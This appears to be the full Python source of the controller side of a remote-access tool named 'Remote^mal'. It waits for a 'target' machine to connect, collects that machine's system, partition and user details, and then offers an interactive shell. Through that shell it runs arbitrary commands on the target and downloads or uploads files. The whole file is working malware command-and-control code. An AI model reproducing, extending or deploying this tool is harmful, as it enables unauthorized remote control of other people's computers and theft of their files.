import socket
import os
import sys
from Load import *
import time

class RemoteServer(object):
    
    def __init__(self,Ip,PortId,CharSet="utf-32",Buffering=1024):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
       self.RecvBuffer = list()     #Buffer used to handle the combined data
    
    def BindServer(self):
        #Bind the serevr at the specified port
        self.server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server_socket.bind(self.Address)
        self.server_socket.listen()
        print("\n\n\x1b[0;31m <!WAITING FOR THE TARGET>...\x1b[0m")
        self.client_socket,self.client_address=self.server_socket.accept()
        print(f"\x1b[0;31mConnected To The Target Machine >>>\x1b[0m \x1b[38;5;208m<{self.client_address[0]}>Ip <{self.client_address[1]}>PortID\x1b[0m\n\n")
        return None

    def Banner(self):
        #Loads The Command Line Banner For The Tool
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text="<<<Remote^mal>>>",color="red"))
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        return None

    def send(self,data):
        #Send data as chunks 
        null_added_data = self.AppendNull(data)
        for i in range(0,len(null_added_data),self.Buffering):
            chunk =null_added_data[i:i+self.Buffering]
            self.client_socket.send(chunk.encode(self.CharSet)) 

        return None

    def recv(self):
        data = ""
        flag = True

        dequeue = self.DequeueHandler()
        if(not dequeue):
            while flag:
                chunk = self.client_socket.recv(self.Buffering).decode(self.CharSet)

                if(len(chunk) >=  1):
                    if(chunk[-1] == '\0'):
                        flag = False
                data += chunk
        
            return self.EnqueueHandler(data.split('\0')) 
        return dequeue        

    def bin_send(self,bin_data):
        #Send data as chunks 
        null_added_data = self.bin_AppendNUll(bin_data)
        for i in range(0,len(null_added_data),self.Buffering):
            chunk =null_added_data[i:i+self.Buffering]
            self.client_socket.send(chunk) 
        return None

    def bin_recv(self):
        bin_data = b""
        flag = True

        while flag:
            chunk = self.client_socket.recv(self.Buffering)
            if(len(chunk) >=  1):
                if(chunk[-1] == 0):
                    flag = False

            bin_data += chunk
        return bin_data
             

    def EnqueueHandler(self,next_data):
        for data in next_data:
            if(not data):
                continue
            self.RecvBuffer.append(data)
        return self.DequeueHandler()

    def DequeueHandler(self):
        if(len(self.RecvBuffer) != 0):
            return self.ByteOrderMark(self.RecvBuffer.pop(0)).replace('\\x00','\x00')
        return None

    def ByteOrderMark(self,data):
        try:
            return data.lstrip('\ufeff') #Remove BOM charcter if it exists.
        except:
            return data

    def DownloadTextFile(self,file_path):
        is_file_exist = self.recv()
        if(is_file_exist == "True"):
            dld_path = input("\x1b[0;32m>>>Enter Download path:\x1b[0m")
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            if(os.path.exists(dld_path)):
                self.send("True")
                with open(dld_path+'/'+file_name,mode='w') as file:
                    file_content = self.recv()
                    if (not file_content):
                        file.write('')
                    else:
                        file.write(file_content)
                print(f"\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m")

            else:
                self.send("False")
                print(f"\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m")

        else:
            print(f"\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m")

    def DownloadedBinaryFile(self,file_path):
        is_file_exist = self.recv()
        if(is_file_exist == "True"):
            dld_path = input("\x1b[0;32m>>>Enter Download path:\x1b[0m")
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            if(os.path.exists(dld_path)):
                self.send("True")
                with open(dld_path+'/'+file_name,mode='wb') as file:
                    file_content = self.bin_recv()
                    if (not file_content):
                        file.write('')
                    else:
                        file.write(file_content)
                print(f"\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m")

            else:
                self.send("False")
                print(f"\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m")

        else:
            print(f"\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m")

    def UploadTextFile(self,file_path):
        is_file_exist = os.path.exists(file_path)
        if(is_file_exist):
            self.send("True")
            upld_path = input("\x1b[0;32m>>>Enter Upload path:\x1b[0m")
            self.send(upld_path)
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            self.send(file_name)
        
            is_upld_path_exist = self.recv()
            if(is_upld_path_exist == "True"):
                with open(file_path,mode='r') as file:
                    file_content = file.read()
                    self.send(file_content)
                write_operation = self.recv()
                if(write_operation == "True"):
                    print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")

            else:
                print(f"\x1b[0;31m The upload path {upld_path} doesn't exist\x1b[0m")

        else:
            self.send("False")
            print(f"\x1b[0;31m The  path {file_path} doesn't exist\x1b[0m")

    def UploadBinaryFile(self,file_path):
        is_file_exist = os.path.exists(file_path)
        if(is_file_exist):
            self.send("True")
            upld_path = input("\x1b[0;32m>>>Enter Upload path:\x1b[0m")
            self.send(upld_path)
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            self.send(file_name)
        
            is_upld_path_exist = self.recv()
            if(is_upld_path_exist == "True"):
                with open(file_path,mode='rb') as file:
                    file_content = file.read()
                    self.bin_send(file_content)
                write_operation = self.recv()
                if(write_operation == "True"):
                    print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")

            else:
                print(f"\x1b[0;31m The upload path {upld_path} doesn't exist\x1b[0m")

        else:
            self.send("False")
            print(f"\x1b[0;31m The  path {file_path} doesn't exist\x1b[0m")

    def GetBuffer(self,flag=False):
        while(flag):
            try:
                #Change the default Buffer Size
                Buffer=input("\x1b[32m>>>Enter the Buffering Amount:\x1b[0m")
                #validating the Buffer Size
                assert (int(Buffer)<=999999999 and int(Buffer)>=1024),"\n\n \x1b[0;31m<Error>: [!]Buffer Size Cannot Be Accepted,It Should Range Between (1024 to 999999999)\x1b[0m\n\n"
                return Buffer
            except AssertionError as e:
                print(e)
        return str(self.Buffering)
    
    def SetBuffer(self):
        #Set Buffering Both Server and client Side
        try:
            if sys.argv[1]=='-b':
                Buffer=self.GetBuffer(flag=True)
            else:
                Buffer=self.GetBuffer()
        except IndexError:
                Buffer=self.GetBuffer()
        print(f"\n\x1b[32m[+]Sockets Are  Buffered with {Buffer}b For Data Transmission\x1b[0m\n")
        self.send(Buffer)
        #Change The Value Of Buffering
        self.Buffering=int(Buffer)
        return None

    def LocationOfFile(self):
        #Get The  Location of the <client>  File Downloaded Path
        self.path=self.recv()
        self.current_path=self.path
        return None

    def AppendNull(self, data):
        data = data.replace('\x00','\\x00')
        return data + '\0'

    def bin_AppendNUll(self,bin_data):
        return bin_data + b'\0'


    def Partitions(self):
        #recieve the partitions and mountpoints of the client
        self.partitions=self.recv()
        self.mountpoints=self.recv()

    def PartitionsInfo(self):
        #recieve  the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        self.partitions_info=self.recv()

    def PartitionTable(self):
        #Display the partition table of the client
        table_data=[["Partition","MountPoint","Type","Memory(GB)"]]
        for data in PathLib.remover(self.partitions_info.splitlines()):
            table_data.append(data.split("\t"))
        
        return table_data


    def SysPlatform(self):
        #Configure the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=self.recv()
        return None
        
    def SysInfo(self):
        #Receive the system information of the client
        keys=[]
        values=[]
        Info=self.recv()
        for line in Info.splitlines():
            for data in line.split("<,>"):
                key,value=data.split("<:>")
                keys.append(key)
                values.append(value)
        table_data=[keys,values]
        return table_data

    def GetUserAndDevice(self):

        #Recieve the User and device name for current logged user
        self.user=self.recv()
        self.device=self.recv()
        return None


    def DisplaySysInfo(self,table_data):

        #Dispaly the tabular information of client system
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text=">"+self.platform,color="green"))
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print()
        print("\x1b[32m[^]System Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
       
    def DisplayPartitionInfo(self,table_data):

        #Dispaly the tabular information of client Partiton
        print(f"\x1b[33m<Warning>: If the Memory is (-1) the file system is not valid for the {self.platform}\x1b[0m")
        print()
        print("\x1b[32m[^]Partition Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()


    def WinPathConfig(self,cmd):

        #Coping current path location
        self.current_path=self.path
        cmd=PathLib.JoinPath(PathLib.RemoveDot(PathLib.remover(PathLib.splitdirectory(cmd[3:len(cmd)]))))
        #Path configuration for directory navigation
        #Relative path navigation
        
        if (not PathLib.isabsolute(cmd) and PathLib.CountDirectories(cmd)>=1):
            self.path+="\\"+cmd

        #Absolute path navigation
        elif (PathLib.isabsolute(cmd)):
            
            if(PathLib.CountDirectories(cmd)>=1):
                self.path=cmd
            else:
                if cmd[-1]=="\\":
                    self.path=cmd
                else:
                    self.path=cmd+"\\"

        self.path=PathLib.replacer(self.path)
        self.path=PathLib.JoinPath(PathLib.RemoveDot(PathLib.remover(PathLib.splitdirectory(self.path))))
        self.send(self.path)

    def WinBackDir(self,cmd):
        #return to the parent directory
        cmd=PathLib.JoinPath(PathLib.BackDotRemover(PathLib.remover(PathLib.splitdirectory(cmd[3:len(cmd)]))))
        self.current_path=self.path
        drive,cwd=PathLib.DriveAPath(self.path)        #return the path and drive in the absolute path
        self.path=PathLib.BackDir(drive,cwd,cmd)
        self.send(self.path)
        
    def UnixPathConfig(self,cmd):

        #Coping current path location
        self.current_path=self.path
        cmd=UnixPathLib.JoinrootPath(UnixPathLib.BackDotRemover(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd[3:len(cmd)]))))
        #Path configuration for directory navigation for Unix Systems
        #Relative path navigation
        if (not UnixPathLib.isabsolute(cmd,self.user)):
            cmd=UnixPathLib.JoinrootPath(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd)))
            self.path+="/"+cmd

        #Absolute path navigation
        elif(UnixPathLib.isabsolute(cmd,self.user)):
            cmd=UnixPathLib.JoinrootPath(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd)))
            self.path=cmd


        self.path=UnixPathLib.ReverseReplacer(self.path,self.user)
        self.send(self.path)

    def UnixBackDir(self,cmd):
        #Used to return to Parent Directory Navigation.
        self.current_path=self.path
        cmd=UnixPathLib.JoinrootPath(UnixPathLib.BackDotRemover(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd[3:len(cmd)]))))
        self.path=UnixPathLib.BackDir(self.user,UnixPathLib.ReverseReplacer(self.path,self.user),UnixPathLib.ReverseReplacer(cmd,self.user))
        self.send(self.path)


    def VerifyPath(self):
        #Verify whether the path is client's path
        flag=self.recv()
        if (flag=="TRUE"):
            pass
        else:
            self.path=self.current_path 
            

    def Getstdin(self):
        #(Stdin) Reciever for the subprocess created by client
        #Recieve the input for the command executed
        while(True):
            #Recieve the flag to indicate the client wheather input is comming or not
            flag=input("\x1b[33m(Does the above command requires any input[Y or N])\x1b[0m?") 

            if(flag.upper()=="Y"): #check the flag is Y for Yes
                self.send(flag)
                stdin=input("\x1b[33m<Input>$\x1b[0m")
                self.send(stdin)
                break

            elif(flag.upper()=="N"): #check the flag is N for no
                self.send(flag)
                break

            else:
                print("\x1b[0;31mWrong input:(Y or N)\x1b[0m") #Any other input considered as wrong
                

    def close(self):
        #close the socket connection.
        print(f"\x1b[0;31mTarget Connection Disconnected:\x1b[0m\n\x1b[0;34m1)Ip:{self.Ip}\n2)PortId:{self.PortId}\n3)UserName:{self.user}\n4)DeviceName:{self.device}\x1b[0m")                   #Message Indicate Closing Connection.
        self.server_socket.close()
        sys.exit(0)     #Exit the Program with Success Code 0. 
        return None


    def main(self):
        #Entry Point of the Program ,Remote Command Execution Start Point:)

        if(self.platform=="win32"):

            #The code Block of windows command execution
            while(True):
                

                #Recieve the command to be executed in Target machine
                cmd=input(f"\x1b[0;34m{self.path}>\x1b[0m")
                self.send(cmd)  #send the command to the client

                if(not cmd):
                    continue

                if((cmd.split()[0]=="cd") and (len(cmd.split())>=2 )):
                    
                    #<WINDOWS>Parent Directory Navigation
                    if(PathLib.isBack(cmd[3:len(cmd)])):
                        self.WinBackDir(cmd)
                        self.VerifyPath()

                    #<WINDOWS>Child Directory Navigation
                    else:
                        self.WinPathConfig(cmd)
                        self.VerifyPath()

                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-dld -t "):].replace("\\","/")
                    if(option == '-t'):
                        self.DownloadTextFile(file_path)
                    elif(option == '-b'):
                        self.DownloadedBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")

                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-upld -t "):].replace("\\","/")
                    if(option == '-t'):
                        self.UploadTextFile(file_path)
                    elif(option == '-b'):
                        self.UploadBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")

                elif(cmd.lower()=="remotequit"):
                    self.close() #Close the socket connection.


                else:
                    #Recieve the output for the command execution
                    self.Getstdin()
                    flag=self.recv()

                    if(flag == "Yes"):
                        stderr = self.recv()
                        print(f"\n\x1b[0;31m{stderr}\x1b[0m\n")
                    else:
                        stdout = self.recv()
                        print(f"\n\x1b[0;32m{stdout}\x1b[0m\n")
             



        elif(self.platform=="linux" or self.platform=="darwin"):

            #The code Block of linux or Mac command execution
            while(True):
                

                #Recieve the command to be executed in Target machine
                cmd=input(f"\n\n\x1b[0;32m{self.user}@{self.device}\x1b[0m:\x1b[0;34m{UnixPathLib.replacer(self.path,self.user)}\x1b[0m$")
                self.send(cmd) #send the command to the client

                if(not cmd):
                    continue

                #Check wheather the contains cd (change directory) for directory navigation
                if((cmd.split()[0]=="cd") and (len(cmd.split())>=2 )):

                    #<UNIX>Parent Directory Navigation
                    if(UnixPathLib.isBack(cmd[3:len(cmd)])):
                        self.UnixBackDir(cmd)
                        self.VerifyPath()

                    #<UNIX>Child Directory Navigation  
                    else:
                        self.UnixPathConfig(cmd)
                        self.VerifyPath()


                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-dld -t ") :].replace("\\","/")
                    if(option == '-t'):
                        self.DownloadTextFile(file_path)
                    elif(option == '-b'):
                        self.DownloadedBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")

                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
                    option = cmd.split()[1]
                    file_path = cmd[len("remotemal-upld -t ") :].replace("\\","/")
                    if(option == '-t'):
                        self.UploadTextFile(file_path)
                    elif(option == '-b'):
                        self.UploadBinaryFile(file_path)
                    else:
                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")

                elif(cmd.lower()=="remotequit"):
                    self.close() #Close the socket connection.

                else:
                    #Recieve the output for the command execution
                    self.Getstdin()
                    flag=self.recv()

                    if(flag == "Yes"):
                        stderr = self.recv()
                        print(f"\n\n\x1b[0;31m{stderr}\x1b[0m\n\n")
                    else:
                        stdout = self.recv()
                        print(f"\n\n\x1b[0;32m{stdout}\x1b[0m\n\n")
                    


        else:

            #RemoteMal Can only work on (Windows,linux,mac) Any other platform will not be Accepted
            print(f"Invalid Operating System {self.platform}") #Message indicates client is running in invalid operating system
            self.close() #close the connection




if __name__=="__main__":
    r=RemoteServer("127.0.0.1",5066)
    r.Banner()
    r.BindServer()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.DisplaySysInfo(r.SysInfo())
    r.PartitionsInfo()
    r.table_data=r.PartitionTable()
    r.DisplayPartitionInfo(r.table_data)
    r.GetUserAndDevice()
    r.main()

#######################################################################################################################################
    
    
    


   
    
